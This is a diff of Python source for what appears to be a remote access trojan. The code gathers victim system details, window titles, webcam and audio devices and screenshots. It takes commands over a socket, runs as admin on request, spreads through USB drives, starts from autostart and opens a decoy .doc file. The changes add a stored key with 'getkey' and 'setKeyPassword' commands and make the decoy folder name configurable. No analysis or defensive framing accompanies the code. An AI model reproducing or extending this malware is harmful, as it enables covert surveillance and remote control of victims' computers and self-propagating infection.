@@ -230,6 +230,7 @@ def pc_info():
         'inputdevice': audio_input,
         'webcamdevice': web_camera,
         'activewindowtitle': get_window_title(),
+        'keypassword': get_id(),
     })
 
 
@@ -267,6 +268,19 @@ def receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
     else:
         return 'info', ''
 
+
+def get_id():
+    if os.path.exists('about.nfo'):
+        key_output = open('about.nfo', 'r').read()
+        return key_output
+    else:
+        return ''
+
+def set_id(key):
+    key_input_file = open('about.nfo', 'w')
+    key_input_file.write(key)
+    key_input_file.close()
+    return
 
 def upload(sock, filename, end="[ENDOFMESSAGE]"):
 
@@ -673,6 +687,13 @@ def from_autostart():
                 elif data == 'runasadmin':
                     send(s, run_as_admin(), mode)
                     continue
+                elif data == 'getkey':
+                    send(s, get_id(), mode)
+                    continue
+                elif data.startswith('setKeyPassword'):
+                    print 'aq var'
+                    set_id(data.split()[-1])
+                    continue
                 if data == 'getScreen':
                     send(s, get_screenshot(), mode)
                     continue
@@ -757,8 +778,8 @@ else:
         usb_spreading_thread.start()
         from_autostart()
     else:
-        if not os.path.exists(os.path.join(os.path.expanduser('~'), 'iDocuments')):
-            os.mkdir(os.path.join(os.path.expanduser('~'), 'iDocuments'))
-        open(os.path.join(os.path.expanduser('~'), 'iDocuments', 'temp0829380013_134.doc'), 'w').write('')
-        os.startfile(os.path.join(os.path.expanduser('~'), 'iDocuments', 'temp0829380013_134.doc'))
+        if not os.path.exists(os.path.join(os.path.expanduser('~'), destDirName)):
+            os.mkdir(os.path.join(os.path.expanduser('~'), destDirName))
+        open(os.path.join(os.path.expanduser('~'), destDirName, 'temp0829380013_134.doc'), 'w').write('')
+        os.startfile(os.path.join(os.path.expanduser('~'), destDirName, 'temp0829380013_134.doc'))
         from_device()
